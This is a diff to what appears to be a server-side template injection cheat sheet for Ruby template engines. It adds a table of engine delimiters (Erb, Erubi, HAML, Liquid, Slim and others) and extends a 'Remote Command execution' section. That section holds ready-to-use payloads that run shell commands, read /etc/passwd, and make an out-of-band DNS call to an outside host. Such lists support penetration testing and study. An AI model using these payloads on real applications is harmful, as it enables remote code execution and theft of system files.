@@ -2,11 +2,25 @@
 
 ## Summary
 
+- [Templating Libraries](#templating-libraries)
 - [Ruby](#ruby)
     - [Ruby - Basic injections](#ruby---basic-injections)
     - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
     - [Ruby - List files and directories](#ruby---list-files-and-directories)
-    - [Ruby - Code execution](#ruby---code-execution)
+    - [Ruby - Remote Command execution](#ruby---remote-Command-execution)
+
+
+## Templating Libraries
+
+| Template Name | Payload Format |
+| ------------ | --------- |
+| Erb      | `<%= %>`   |
+| Erubi    | `<%= %>`   |
+| Erubis   | `<%= %>`   |
+| HAML     | `#{ }`     |
+| Liquid   | `{{ }}`    |
+| Mustache | `{{ }}`    |
+| Slim     | `#{ }`     |
 
 
 ## Ruby
@@ -37,11 +51,12 @@
 <%= Dir.entries('/') %>
 ```
 
-### Ruby - Code execution
+### Ruby - Remote Command execution
 
-Execute code using SSTI for **ERB** engine.
+Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.
 
 ```ruby
+<%=(`nslookup oastify.com`)%>
 <%= system('cat /etc/passwd') %>
 <%= `ls /` %>
 <%= IO.popen('ls /').readlines()  %>
